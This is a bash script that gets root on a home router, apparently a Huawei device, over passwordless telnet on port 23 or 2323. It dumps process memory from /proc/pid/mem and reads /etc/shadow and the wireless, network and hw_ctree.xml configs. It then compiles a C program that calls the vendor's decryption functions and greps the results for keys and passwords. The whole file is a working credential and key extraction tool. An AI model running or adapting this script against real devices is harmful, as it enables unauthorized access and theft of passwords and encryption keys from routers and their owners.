#!/bin/bash

# Direct Root Telnet Memory Extraction
# Simple approach using basic telnet commands

ROUTER_IP="192.168.1.1"
OUTPUT_DIR="/home/recep/Masaüstü/Firmware/root_memory_extraction"

echo "=== Direct Root Telnet Memory Extraction ==="
echo "Router: $ROUTER_IP"
echo "Output: $OUTPUT_DIR"
echo

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Try standard port first
echo "[*] Trying Telnet port 23..."
{
    sleep 2
    echo "root"
    sleep 2
    echo "ps aux | head -20"
    sleep 3
    echo "exit"
} | timeout 15 telnet "$ROUTER_IP" 2>/dev/null > "$OUTPUT_DIR/ps_test.txt"

# Check if we got output
if grep -q "root\|PID\|USER" "$OUTPUT_DIR/ps_test.txt" 2>/dev/null; then
    echo "[+] Telnet connection successful on port 23!"
    TELNET_PORT="23"
else
    echo "[*] Trying Telnet port 2323..."
    {
        sleep 2
        echo "root"
        sleep 2
        echo "ps aux | head -20"
        sleep 3
        echo "exit"
    } | timeout 15 telnet "$ROUTER_IP" 2323 2>/dev/null > "$OUTPUT_DIR/ps_test_2323.txt"
    
    if grep -q "root\|PID\|USER" "$OUTPUT_DIR/ps_test_2323.txt" 2>/dev/null; then
        echo "[+] Telnet connection successful on port 2323!"
        TELNET_PORT="2323"
        cp "$OUTPUT_DIR/ps_test_2323.txt" "$OUTPUT_DIR/ps_test.txt"
    else
        echo "[-] Telnet connection failed on both ports"
        exit 1
    fi
fi

# Function to execute command via telnet
telnet_exec() {
    local cmd="$1"
    local timeout="${2:-30}"
    local output_file="$3"
    
    {
        sleep 2
        echo "root"
        sleep 2
        echo "$cmd"
        sleep 5
        echo "exit"
    } | timeout "$timeout" telnet "$ROUTER_IP" "$TELNET_PORT" 2>/dev/null > "$output_file"
}

# 1. Get complete process list
echo "[*] Getting complete process list..."
telnet_exec "ps aux" 30 "$OUTPUT_DIR/all_processes.txt"
telnet_exec "ps -ef" 30 "$OUTPUT_DIR/all_processes_extended.txt"

# 2. Find crypto processes
echo "[*] Finding crypto processes..."
telnet_exec "ps aux | grep -E 'smp|crypto|cipher|decrypt|encrypt|capi'" 30 "$OUTPUT_DIR/crypto_processes.txt"

# 3. Get all PIDs
echo "[*] Getting all process PIDs..."
telnet_exec "ls /proc | grep -E '^[0-9]+$'" 30 "$OUTPUT_DIR/all_pids.txt"

# 4. Dump memory from key processes
echo "[*] Starting memory dump..."

# Create memory dump script
memory_script='
echo "=== Memory Dump Started ==="
echo "Timestamp: $(date)"
echo

# Get crypto process PIDs
CRYPTO_PIDS=$(ps aux | grep -E "smp|crypto|cipher" | awk "{print \$2}")

for pid in $CRYPTO_PIDS; do
    if [ -d "/proc/$pid" ]; then
        echo "=== Processing PID $pid ==="
        
        # Get process info
        echo "PID: $pid"
        ps -p $pid -o pid,cmd 2>/dev/null || echo "Process not found"
        
        # Get memory maps
        if [ -f "/proc/$pid/maps" ]; then
            echo "Memory maps:"
            cat "/proc/$pid/maps" | head -10
        fi
        
        # Try to dump memory
        if [ -r "/proc/$pid/mem" ]; then
            echo "Memory readable, dumping..."
            
            # Dump from different offsets
            for offset in 0x1000 0x10000 0x100000 0x1000000; do
                echo "Dumping from offset $offset..."
                dd if="/proc/$pid/mem" bs=1 skip=$((offset)) count=1048576 2>/dev/null | strings -n 16 | head -20
                echo "---"
            done
            
            # Also dump heap if found
            grep -E "heap" "/proc/$pid/maps" | while read line; do
                addr_range=$(echo "$line" | awk "{print \$1}")
                if [ -n "$addr_range" ]; then
                    echo "Dumping heap $addr_range..."
                    start_addr=$(echo "$addr_range" | cut -d"-" -f1)
                    size=$((0x$(echo "$addr_range" | cut -d"-" -f2) - 0x$start_addr))
                    if [ $size -gt 0 ] && [ $size -lt 2097152 ]; then
                        dd if="/proc/$pid/mem" bs=1 skip=$((0x$start_addr)) count=$size 2>/dev/null | strings -n 16 | head -30
                    fi
                fi
            done
            
        else
            echo "Memory not readable for PID $pid"
        fi
        
        echo "=== End PID $pid ==="
        echo
    fi
done

echo "Memory dump completed"
'

# Execute memory dump
echo "[*] Executing memory dump script..."
telnet_exec "$memory_script" 180 "$OUTPUT_DIR/memory_dump.txt"

# 5. Extract configuration files
echo "[*] Extracting configuration files..."

# Get configs one by one
config_commands=(
    "cat /etc/passwd"
    "cat /etc/shadow"
    "cat /etc/config/wireless"
    "cat /etc/config/network"
    "cat /etc/config/system"
    "uci show"
    "env | head -20"
    "find /etc -name '*.conf' | head -10"
    "cat /mnt/jffs2/hw_ctree.xml"
)

for i in "${!config_commands[@]}"; do
    cmd="${config_commands[$i]}"
    echo "[*] Getting config $((i+1))/${#config_commands[@]}"
    telnet_exec "$cmd" 30 "$OUTPUT_DIR/config_$((i+1)).txt"
done

# 6. Trigger crypto operations
echo "[*] Triggering crypto operations..."

crypto_script='
echo "=== Crypto Operations Started ==="

# Create crypto test
cat > /tmp/crypto_test.c << "EOFC"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int HW_Mobilemng_SetTaskSource() { return 0; }
int SRV_COMM_GetNewExportType() { return 0; }
void* SRV_COMM_GetExportValue() { return NULL; }
void* CAPI_SMP_GetWanInterfaceStatus() { return NULL; }

int main() {
    void *handle;
    int (*decrypt_func)(const char*, char*);
    char output[1024];
    
    printf("=== Crypto Test ===\\n");
    
    // Test primary function
    handle = dlopen("/lib/libhw_smp_capi.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "CAPI_SMP_DecryptCipherText");
        if (decrypt_func) {
            printf("Testing CAPI_SMP_DecryptCipherText...\\n");
            const char* inputs[] = {"admin", "superonline", "password", "test123", "huawei"};
            for (int i = 0; i < 5; i++) {
                memset(output, 0, sizeof(output));
                int result = decrypt_func(inputs[i], output);
                printf("Input: %-15s -> Output: \\"%s\\"\\n", inputs[i], output);
            }
        }
        dlclose(handle);
    }
    
    // Test fallback function
    handle = dlopen("/lib/libl3_base_api.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "WAN_IF_DecryptPPPoEPassWord");
        if (decrypt_func) {
            printf("\\nTesting WAN_IF_DecryptPPPoEPassWord...\\n");
            const char* inputs[] = {"admin", "superonline", "password"};
            for (int i = 0; i < 3; i++) {
                memset(output, 0, sizeof(output));
                int result = decrypt_func(inputs[i], output);
                printf("Input: %-15s -> Output: \\"%s\\"\\n", inputs[i], output);
            }
        }
        dlclose(handle);
    }
    
    return 0;
}
EOFC

# Compile and run
gcc -o /tmp/crypto_test /tmp/crypto_test.c -ldl 2>/dev/null
if [ -f /tmp/crypto_test ]; then
    echo "Crypto test compiled successfully"
    /tmp/crypto_test &
    CRYPTO_PID=$!
    echo "Crypto test PID: $CRYPTO_PID"
    
    # Wait and dump memory
    sleep 3
    if [ -r "/proc/$CRYPTO_PID/mem" ]; then
        echo "Dumping crypto process memory..."
        dd if="/proc/$CRYPTO_PID/mem" bs=4096 count=200 2>/dev/null | strings -n 32
        echo "Memory dump completed"
    else
        echo "Crypto memory not readable"
    fi
    
    kill $CRYPTO_PID 2>/dev/null
    rm -f /tmp/crypto_test /tmp/crypto_test.c
else
    echo "Failed to compile crypto test"
fi
'

telnet_exec "$crypto_script" 120 "$OUTPUT_DIR/crypto_operations.txt"

# 7. Create summary
echo "[*] Creating extraction summary..."

cat > "$OUTPUT_DIR/extraction_summary.txt" << EOF
=== Direct Root Telnet Memory Extraction Summary ===
Date: $(date)
Router IP: $ROUTER_IP
Telnet Port: $TELNET_PORT
Root Access: Yes

=== Files Extracted ===

Process Information:
- all_processes.txt: Complete process list
- all_processes_extended.txt: Extended process information
- crypto_processes.txt: Crypto-related processes
- all_pids.txt: All process PIDs

Memory Analysis:
- memory_dump.txt: Memory dumps from crypto processes
- crypto_operations.txt: Live crypto operation results

Configuration Files:
- config_*.txt: Various configuration files

=== Key Search Commands ===

Search for encryption keys in memory dumps:
grep -E "[0-9a-fA-F]{32,}" memory_dump.txt
grep -E "[A-Za-z0-9+/]{32,}=" memory_dump.txt
grep -iE "key|password|secret" memory_dump.txt

Search in configuration files:
grep -riE "password|key|secret" config_*.txt

=== Analysis Results ===

Check these files for encryption keys:
- memory_dump.txt: Look for hex/Base64 keys
- crypto_operations.txt: Check crypto operation outputs
- config_*.txt: Find encrypted passwords

=== Next Steps ===

1. Search memory_dump.txt for encryption keys
2. Review crypto_operations.txt for decrypted outputs
3. Check configuration files for encrypted passwords
4. Test any found keys with decryption functions

EOF

echo
echo "[+] Direct root memory extraction completed!"
echo "[*] Results saved to: $OUTPUT_DIR"
echo "[*] Summary: $OUTPUT_DIR/extraction_summary.txt"

# Show quick findings
echo
echo "=== Quick Findings ==="
echo "Process files: $(ls -1 "$OUTPUT_DIR" | grep -E "processes|pids" | wc -l)"
echo "Memory dumps: $(ls -1 "$OUTPUT_DIR" | grep -E "memory|crypto" | wc -l)"
echo "Config files: $(ls -1 "$OUTPUT_DIR" | grep "config_" | wc -l)"

# Look for immediate key findings
if [ -f "$OUTPUT_DIR/memory_dump.txt" ]; then
    key_count=$(grep -cE "[0-9a-fA-F]{32,}|[A-Za-z0-9+/]{32,}=" "$OUTPUT_DIR/memory_dump.txt" 2>/dev/null || echo "0")
    echo "Potential keys in memory dump: $key_count"
    
    if [ "$key_count" -gt 0 ]; then
        echo "Sample keys found:"
        grep -E "[0-9a-fA-F]{32,}|[A-Za-z0-9+/]{32,}=" "$OUTPUT_DIR/memory_dump.txt" | head -5 | sed 's/^/  /'
    fi
fi

echo
echo "Extraction complete. Review files in $OUTPUT_DIR for detailed analysis."
